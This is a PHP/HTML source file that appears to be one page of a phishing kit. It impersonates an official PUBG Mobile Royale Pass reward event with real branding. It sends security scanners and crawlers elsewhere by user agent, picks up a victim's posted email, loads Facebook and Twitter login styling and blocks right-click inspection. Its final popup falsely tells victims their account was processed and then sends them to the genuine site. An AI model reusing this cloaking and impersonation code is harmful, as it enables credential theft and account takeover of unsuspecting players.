<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cgfhnfhn.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="containerHome rewardsBox">
<div class="navbar">
<img class="navbar-logo" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-title">
PUBG MOBILE
<br>
<span>The original Battle Royale, <br> the first and the best!</span>
</div> <!--- navbar-title --->
<div class="navbar-download">
<img class="navbar-menu" src="https://i.ibb.co/DV5fKmN/menu.png">
<img class="navbar-pay" src="https://i.ibb.co/FzLrjnF/pay.png">
</div> <!--- navbar-download --->
</div> <!--- navbar --->
<div class="header">
<video src="media/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="season-alert">
<img class="season-alert-img" src="https://www.pubgmobile.com/images/event/royalepassm5/kv_logo.png">
<div class="slider">
<div class="season-alert-title">Royale Pass Month 5: Mirror Realm</div>
</div>
<div class="slider">
<div class="season-alert-desc">Choose your free rewards here now!</div>
</div>
</div> <!--- season-alert --->
<div class="box">
<div class="menu-wrapper-border"></div>
<div class="menu-wrapper">
<div class="menu-content kanan" onmousedown="buka.play();" onclick="openRewards(event, 'other');">Other Reward</div>
<div class="menu-content kiri" onmousedown="buka.play();" onclick="openRewards(event, 'season');" id="defaultTabRewards">Season Reward</div>
<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'weapon');">Weapon Reward</div>
</div> <!--- menu-wrapper --->
<center>
<div class="tab_rewards" id="season">
<div class="scroll">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/3.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/5.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/6.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/6.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/7.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/7.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/8.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/8.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/9.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/9.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/10.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/10.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/11.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/11.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/12.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/12.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/13.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/13.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/14.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/14.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/15.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/15.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/16.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/16.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/17.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/17.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/18.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/18.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/19.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/19.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/20.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/20.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/rewards/21.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/21.png">Collect</button>
</div>
</div>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
</center>
</div> <!--- box --->
<div class="footer">
<div class="footer-txt-follow">Follow Us</div> <!--- footer-txt-follow --->
<center>
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
</center>
<img class="footer-copyright-icon" src="https://i.ibb.co/Wx8wkq1/footer-img.png">
<div class="footer-txt-copyright">ⓒ 2017 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">ⓒ 2018-<?php echo $yearNow;?> Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup reward_confirmation">
<div class="popup-box">
<div class="nav-popup">
<div class="nav-popup-title">Processing Account</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
<div class="popup-box-bg">
<div class="popup-alert">
Thanks for joining this RP Month 5 event
<br>
<br>
Your account has been successfully processed
<br>
Please wait up to 24 hours
</div> <!--- popup-alert --->
<br>
</div> <!--- popup-box-bg --->
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" class="popup-footer-active" style="margin-right: 0; float: none;" onclick="location.href='https://pubgmobile.com/';">Logout</button>
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>

</body>
</html>